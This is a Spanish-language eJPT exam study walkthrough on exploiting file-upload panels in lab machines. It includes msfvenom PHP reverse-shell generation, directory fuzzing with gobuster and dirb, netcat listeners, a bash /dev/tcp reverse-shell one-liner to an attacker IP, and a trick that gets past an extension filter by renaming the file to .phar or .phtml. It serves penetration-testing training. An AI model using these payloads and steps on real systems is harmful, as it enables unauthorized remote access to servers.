1. Buscamos un panel de registro y nos registramos:
![File Upload 2](ejpt/img/file-upload-2.png)

2. Investigamos en **Metasploit** la marca en la que esta creada la web (**cutenews**), siempre que veamos una marca o nombre lo buscamos en **Metasploit** (en este caso no hará falta pero en el examen por si acaso hay que hacerlo):
```
msfconsole
```

```
search cutenews
```
![File Upload 3](ejpt/img/file-upload-3.png)

3. Siempre tenemos que buscar paneles donde este permitido subir archivos:
![File Upload 1](ejpt/img/file-upload-1.png)

4. Utilizaremos **msfvenom** para generar el **payload** que subiremos al campo de avatar:
```
msfvenom -p php/reverse_php LHOST=192.168.1.137 LPORT=443 -f raw > pwned.php
```
![File Upload 4](ejpt/img/file-upload-4.png)

- ***IMPORTANTE: El LHOST es la IP atacante, el payload tiene que ser PHP porque la vamos a introducir en una web***

5. Subimos el **payload** al campo del avatar:
![File Upload 5](ejpt/img/file-upload-5.png)

6. Hacemos **Fuzzing Web** para obtener el directorio donde se ha guardado mi **pwned.php** (normalmente esta en el directorio **uploads**):
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://192.168.1.139
```
![File Upload 6](ejpt/img/file-upload-6.png)

7. Hemos encontrado el directorio **uploads**, entonces pondremos el puerto 443 en escucha con **Netcat** parar recibir la **Reverse Shell**, ahora accederé al directorio y ejecutaré el **pwned.php**:

```
nc -nlvp 443
```
![File Upload 8](ejpt/img/file-upload-8.png)

8. El **Payload** generado por **msfvenom** no es estable (al cabo de un rato se pierde la conexión). Entonces ponemos con **Netcat** otro puerto en escucha (Ej. 4444), luego, desde una maquina de fuera del examen (en el examen no hay conexion a internet) visitamos la web https://revshells.com, y nos copiamos el **Payload** (puerto 4444) del apartado **Bash -i** y lo pegamos en la **Reverse Shell** recibida por el puerto 443, ya podriamos cerrar la conexión del puerto 443.
```
nc -nlvp 4444
```

```
bash -c "sh -i >& /dev/tcp/192.168.0.32/443 0>&1"
```
![File Upload 9](ejpt/img/file-upload-9.png)



- ***PARTE 2***:

1. Utilizamos **Dirb** (encontramos directorio uploads) y **Gobuster** (encontramos el panel de subida de archivos) para hacer **Fuzzing Web**.
```
dirb http://172.17.0.2
```
- *Utilizamos **Dirb** porque **Gobuster** no suele estar instalado en el examen de la **eJPTv2**, pero en el examen con **Dirb** deberiamos de poder encontrarlo todo directamente.*

![File Upload 12](ejpt/img/file-upload-12.png)

![File Upload 10](ejpt/img/file-upload-10.png)

```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,bak,html,txt
```

![File Upload 11](ejpt/img/file-upload-11.png)

![File Upload 13](ejpt/img/file-upload-13.png)

2. Vamos a la web https://revshells.com y nos copiamos la **Reverse Shell** en **PHP** de **PentestMonkey** y la copiamos en un archivo vacío:

![File Upload 15](ejpt/img/file-upload-15.png)

![File Upload 16](ejpt/img/file-upload-16.png)


3. Le damos al botón **Browse**, buscamos el archivo con la **Reverse Shell**, la subimos al panel de subida de archivos y ponemos el puerto 4444 en escucha con **Netcat** (sudo nc -nlvp 4444):
![File Upload 14](ejpt/img/file-upload-14.png)

4. Vemos que el archivo no se sube al directorio uploads, eso pasa porque el servidor no acepta archivos .php, entonces le cambiaré la extensión a una muy similar como **phar** o **phtml**:
![File Upload 17](ejpt/img/file-upload-17.png)

5. Subimos un archivo de esos al servidor mediante el panel de subida de archivos:
![File Upload 18](ejpt/img/file-upload-18.png)

6. Nos avisan de que hemos subido el archivo con la **Reverse Shell** correctamente, entonces ahora si recargamos el directorio uploads veremos el archivo con la **Reverse Shell**:
![File Upload 19](ejpt/img/file-upload-19.png)

![File Upload 20](ejpt/img/file-upload-20.png)


7. Ahora klikamos encima del archivo malicioso y como tenemos el puerto 4444 en escucha (con **Netcat**) recibiremos la **Reverse Shell** de la maquina victima:
![File Upload 21](ejpt/img/file-upload-21.png)